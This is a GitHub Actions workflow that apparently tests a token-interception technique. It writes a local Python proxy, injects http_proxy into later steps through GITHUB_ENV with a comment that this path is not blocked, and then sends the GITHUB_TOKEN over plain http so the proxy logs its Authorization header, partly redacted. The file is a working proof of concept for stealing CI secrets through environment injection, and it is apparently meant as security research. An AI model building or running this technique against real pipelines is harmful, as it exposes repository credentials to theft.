name: MITM Token Capture v2
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  mitm-capture:
    runs-on: ubuntu-latest
    steps:
      - name: Start python proxy and inject via GITHUB_ENV
        run: |
          # Python3 HTTP proxy that logs captured requests
          cat > /tmp/proxy.py << 'PYEOF'
          import http.server, socketserver, sys, os
          class ProxyHandler(http.server.BaseHTTPRequestHandler):
              def do_GET(self):
                  with open('/tmp/captured_headers.txt', 'a') as f:
                      f.write(f"METHOD: {self.command}\n")
                      f.write(f"PATH: {self.path}\n")
                      for k, v in self.headers.items():
                          if k.lower() == 'authorization':
                              f.write(f"CAPTURED_AUTH: {v[:20]}...REDACTED\n")
                              f.write(f"CAPTURED_AUTH_LENGTH: {len(v)}\n")
                          else:
                              f.write(f"HEADER: {k}: {v}\n")
                      f.write("---END---\n")
                  self.send_response(502)
                  self.end_headers()
                  self.wfile.write(b"proxy-intercepted")
              do_POST = do_GET
              do_PUT = do_GET
              do_CONNECT = do_GET
              def log_message(self, format, *args): pass
          with socketserver.TCPServer(("127.0.0.1", 18080), ProxyHandler) as s:
              s.handle_request()
          PYEOF
          
          # Start proxy in background
          python3 /tmp/proxy.py &
          PROXY_PID=$!
          sleep 1
          echo "Python proxy started (PID=$PROXY_PID)"
          
          # Verify it's listening
          ss -tlnp | grep 18080 || echo "Port check failed"
          
          # INJECT proxy via GITHUB_ENV (NOT BLOCKED - only NODE_OPTIONS is blocked)
          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
          echo "Proxy injected via GITHUB_ENV"
          
      - name: Victim step - API call sends GITHUB_TOKEN through proxy
        run: |
          echo "http_proxy=$http_proxy"
          echo "Making API call with GITHUB_TOKEN..."
          # Use http:// (not https://) so the proxy can see the full request
          curl --max-time 5 -sS \
            -H "Authorization: token $GITHUB_TOKEN" \
            "http://api.github.com/repos/toofikz/public-test-repo" 2>&1 || true
          
          echo ""
          echo "=== PROXY CAPTURE LOG ==="
          if [ -f /tmp/captured_headers.txt ]; then
            cat /tmp/captured_headers.txt
          else
            echo "No captures (proxy may not have received the request)"
          fi
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
